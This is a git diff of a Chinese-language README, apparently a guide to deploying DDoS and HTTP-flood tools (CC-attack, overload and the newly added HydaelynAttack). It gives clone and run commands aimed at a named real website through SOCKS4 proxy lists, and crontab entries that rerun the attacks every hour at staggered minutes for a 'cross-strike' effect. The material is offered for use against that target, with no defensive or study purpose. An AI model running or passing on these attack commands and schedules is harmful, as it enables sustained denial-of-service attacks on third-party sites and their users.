@@ -15,6 +15,7 @@
 - [x] [**Leeon123/CC-attack**](https://github.com/Leeon123/CC-attack)
 - [x] [**TheSpeedX/PROXY-List**](https://github.com/TheSpeedX/PROXY-List)
 - [x] [**7zx/overload**](https://github.com/7zx/overload)
+- [x] [**NyaaCaster/HydaelynAttack**](https://github.com/NyaaCaster/HydaelynAttack)
 
 ## linunx系统语法注意
 - 如果是ubuntu debian系的系统，命令前缀使用 apt
@@ -48,18 +49,28 @@ cd ..
 ```
 - overload_p.py这个脚本可以自己打开看一下，里面我把手动输入的变量全部写死了以便当自动脚本使用，目标网址可以根据自己情况调整
 
+## 安装HydaelynAttack（ddos工具，流量开销大，每轮攻击12M，计费流量的自己规划好开销）
+```shell
+git clone https://github.com/NyaaCaster/HydaelynAttack.git
+```
 
 ## 如果要单独一次性执行cc
 ```shell
 python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
 ```shell
 - 命令中地址自己根据情况调整目标网址
-
-## 如果要单独一次性执行ddos
+```
+## 如果要单独一次性执行overload
 ```shell
 python3 ~/overload/overload_p.py
 ```
 - 自己修改建立了新脚本后执行自己的就可以
+
+## 如果要单独性执行HydaelynAttack
+```shell
+python3 ~/HydaelynAttack/HydaelynAttack_p.py
+```
+- HydaelynAttack项目有多个脚本可选，具体看该项目说明
 
 
 ## 部署订制执行计划
@@ -71,11 +82,12 @@ crontab -e
 ## 插入的计划任务
 ```shell
 0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
+15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p.py
 30 * * * * python3 ~/overload/overload_p.py
 ```
 - 编辑完成后按esc退出编辑
 - 英文输入 :qw 保存退出，之后即使重启系统，依然会定时执行
-- 时间计划可以自己安排，最好跟我的0和30错开，打到交叉打击效果
+- 时间计划可以自己安排，最好跟我的0 15 30错开，打到交叉打击效果
 
 ## 附录：crontab的语法简要说明
 ```shell
